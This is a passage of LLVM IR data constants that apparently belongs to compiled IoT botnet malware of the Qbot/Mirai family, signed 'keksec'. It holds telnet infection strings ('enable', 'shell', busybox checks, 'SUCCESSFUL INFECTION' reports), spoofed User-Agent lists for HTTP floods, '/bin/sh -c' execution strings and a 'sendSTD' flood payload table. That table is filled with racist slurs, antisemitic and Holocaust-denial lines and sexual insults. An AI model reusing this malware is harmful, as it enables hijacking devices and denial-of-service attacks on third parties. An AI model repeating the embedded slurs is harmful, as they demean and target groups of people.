@.str.258 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.259 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@.str.260 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.261 = private unnamed_addr constant [7 x i8] c"usybox\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.257, i32 0, i32 0), i8* null], align 16
@.str.262 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.263 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.264 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@legit = global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.265, i32 0, i32 0), i8* null], align 16
@.str.265 = private unnamed_addr constant [5 x i8] c"AK47\00", align 1
@infected = global [2 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.266, i32 0, i32 0), i8* null], align 16
@.str.266 = private unnamed_addr constant [8 x i8] c"LULZbOT\00", align 1
@UserAgents = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.302, i32 0, i32 0)], align 16
@.str.267 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.268 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.269 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.270 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.271 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.272 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.273 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.274 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.275 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.276 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.277 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.278 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.279 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.280 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.281 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.282 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.283 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.284 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.285 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.286 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.287 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.288 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.289 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.290 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.291 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.292 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.293 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.294 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.295 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.296 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.297 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.298 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.299 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.300 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.301 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.302 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@pids = common global i32* null, align 8
@sleeptime = global i32 100, align 4
@pps = common global i32 0, align 4
@limiter = common global i32 0, align 4
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@head = common global %struct.list* null, align 8
@tehport = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.303 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.492 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.304 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.305 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.306 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.307 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.308 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.309 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.310 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.311 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.312 = private unnamed_addr constant [3 x i8] c"80\00", align 1
@.str.313 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.314 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.315 = private unnamed_addr constant [19 x i8] c"REPORT %s:23 %s:%s\00", align 1
@.str.316 = private unnamed_addr constant [9 x i8] c"enable\0D\0A\00", align 1
@.str.317 = private unnamed_addr constant [9 x i8] c"system\0D\0A\00", align 1
@.str.318 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.319 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.320 = private unnamed_addr constant [27 x i8] c"echo -e '\5Cx41\5Cx4b\5Cx34\5Cx37'\00", align 1
@.str.321 = private unnamed_addr constant [35 x i8] c"SUCCESSFUL INFECTION ---> %s:%s:%s\00", align 1
@.str.322 = private unnamed_addr constant [31 x i8] c"FAILED TO INFECT ---> %s:%s:%s\00", align 1
@.str.323 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.324 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [78 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.401, i32 0, i32 0)], align 16
@.str.402 = private unnamed_addr constant [20 x i8] c"STD attacking %s:%s\00", align 1
@.str.325 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.326 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.327 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.328 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.329 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.330 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.331 = private unnamed_addr constant [10 x i8] c"tfw no gf\00", align 1
@.str.332 = private unnamed_addr constant [11 x i8] c"frienzoned\00", align 1
@.str.333 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.334 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.335 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.336 = private unnamed_addr constant [7 x i8] c"keksec\00", align 1
@.str.337 = private unnamed_addr constant [11 x i8] c"keksec rox\00", align 1
@.str.338 = private unnamed_addr constant [11 x i8] c"keksec ROX\00", align 1
@.str.339 = private unnamed_addr constant [10 x i8] c"get raped\00", align 1
@.str.340 = private unnamed_addr constant [18 x i8] c"not a ddos packet\00", align 1
@.str.341 = private unnamed_addr constant [23 x i8] c"also not a ddos packet\00", align 1
@.str.342 = private unnamed_addr constant [28 x i8] c"seriously not a ddos packet\00", align 1
@.str.343 = private unnamed_addr constant [38 x i8] c"GET / HTTP/1.1\0D\0AHost: goatse.info\0D\0A\0D\0A\00", align 1
@.str.344 = private unnamed_addr constant [37 x i8] c"GET / HTTP/1.1\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00", align 1
@.str.345 = private unnamed_addr constant [38 x i8] c"GET / HTTP/1.0\0D\0AHost: goatse.info\0D\0A\0D\0A\00", align 1
@.str.346 = private unnamed_addr constant [37 x i8] c"GET / HTTP/1.0\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00", align 1
@.str.347 = private unnamed_addr constant [16 x i8] c"8======D~~~~~~~\00", align 1
@.str.348 = private unnamed_addr constant [8 x i8] c"suck it\00", align 1
@.str.349 = private unnamed_addr constant [10 x i8] c"give succ\00", align 1
@.str.350 = private unnamed_addr constant [47 x i8] c"big nigger dick 8============================D\00", align 1
@.str.351 = private unnamed_addr constant [18 x i8] c"( . Y . ) tiddies\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"bigkek\00", align 1
@.str.353 = private unnamed_addr constant [13 x i8] c"eye pee rape\00", align 1
@.str.354 = private unnamed_addr constant [21 x i8] c"eye pee address rape\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"IP rape\00", align 1
@.str.356 = private unnamed_addr constant [13 x i8] c"This is LOIC\00", align 1
@.str.357 = private unnamed_addr constant [5 x i8] c"LOIC\00", align 1
@.str.358 = private unnamed_addr constant [5 x i8] c"HOIC\00", align 1
@.str.359 = private unnamed_addr constant [5 x i8] c"XOIC\00", align 1
@.str.360 = private unnamed_addr constant [7 x i8] c"LHXOIC\00", align 1
@.str.361 = private unnamed_addr constant [33 x i8] c"A cat is fine too. Desudesudesu~\00", align 1
@.str.362 = private unnamed_addr constant [18 x i8] c"the biiiiig pussy\00", align 1
@.str.363 = private unnamed_addr constant [6 x i8] c"benis\00", align 1
@.str.364 = private unnamed_addr constant [6 x i8] c"penis\00", align 1
@.str.365 = private unnamed_addr constant [5 x i8] c"dick\00", align 1
@.str.366 = private unnamed_addr constant [7 x i8] c"vagina\00", align 1
@.str.367 = private unnamed_addr constant [9 x i8] c"clitoris\00", align 1
@.str.368 = private unnamed_addr constant [6 x i8] c"pussy\00", align 1
@.str.369 = private unnamed_addr constant [4 x i8] c"tfw\00", align 1
@.str.370 = private unnamed_addr constant [4 x i8] c":^}\00", align 1
@.str.371 = private unnamed_addr constant [9 x i8] c"dic pic?\00", align 1
@.str.372 = private unnamed_addr constant [11 x i8] c"send nudes\00", align 1
@.str.373 = private unnamed_addr constant [29 x i8] c"https://youtu.be/dQw4w9WgXcQ\00", align 1
@.str.374 = private unnamed_addr constant [24 x i8] c"Never gonna give you up\00", align 1
@.str.375 = private unnamed_addr constant [25 x i8] c"Never gonna make you cry\00", align 1
@.str.376 = private unnamed_addr constant [24 x i8] c"Never gonna let you die\00", align 1
@.str.377 = private unnamed_addr constant [21 x i8] c"Never gonna hurt you\00", align 1
@.str.378 = private unnamed_addr constant [14 x i8] c"bush did 9/11\00", align 1
@.str.379 = private unnamed_addr constant [32 x i8] c"jet fuel can't melt steel beams\00", align 1
@.str.380 = private unnamed_addr constant [23 x i8] c"9/11 was an inside job\00", align 1
@.str.381 = private unnamed_addr constant [23 x i8] c"the illuminati is real\00", align 1
@.str.382 = private unnamed_addr constant [14 x i8] c"wake up sheep\00", align 1
@.str.383 = private unnamed_addr constant [22 x i8] c"i flex like david ike\00", align 1
@.str.384 = private unnamed_addr constant [35 x i8] c"6 million jews? show me the proof!\00", align 1
@.str.385 = private unnamed_addr constant [18 x i8] c"T R I G G E R E D\00", align 1
@.str.386 = private unnamed_addr constant [22 x i8] c"free masons suck cock\00", align 1
@.str.387 = private unnamed_addr constant [10 x i8] c"ihatejews\00", align 1
@.str.388 = private unnamed_addr constant [6 x i8] c"urgay\00", align 1
@.str.389 = private unnamed_addr constant [16 x i8] c"tfw u like dick\00", align 1
@.str.390 = private unnamed_addr constant [9 x i8] c"dickbutt\00", align 1
@.str.391 = private unnamed_addr constant [20 x i8] c"The elusive dickbut\00", align 1
@.str.392 = private unnamed_addr constant [27 x i8] c"Heyyy that's pretty gooood\00", align 1
@.str.393 = private unnamed_addr constant [15 x i8] c"NSA sucks cock\00", align 1
@.str.394 = private unnamed_addr constant [15 x i8] c"FBI sucks cock\00", align 1
@.str.395 = private unnamed_addr constant [55 x i8] c"You name it they suck cockWhat am I doing with my life\00", align 1
@.str.396 = private unnamed_addr constant [28 x i8] c"Oh yeah I like nulling shit\00", align 1
@.str.397 = private unnamed_addr constant [29 x i8] c"HIIYYOOOOOOO (Customgrow420)\00", align 1
@.str.398 = private unnamed_addr constant [28 x i8] c"Keemstar is a fucking knome\00", align 1
@.str.399 = private unnamed_addr constant [17 x i8] c"Leafy is gawd <3\00", align 1
@.str.400 = private unnamed_addr constant [25 x i8] c"Ourmine is full of skids\00", align 1
@.str.401 = private unnamed_addr constant [20 x i8] c"STC is the greatest\00", align 1
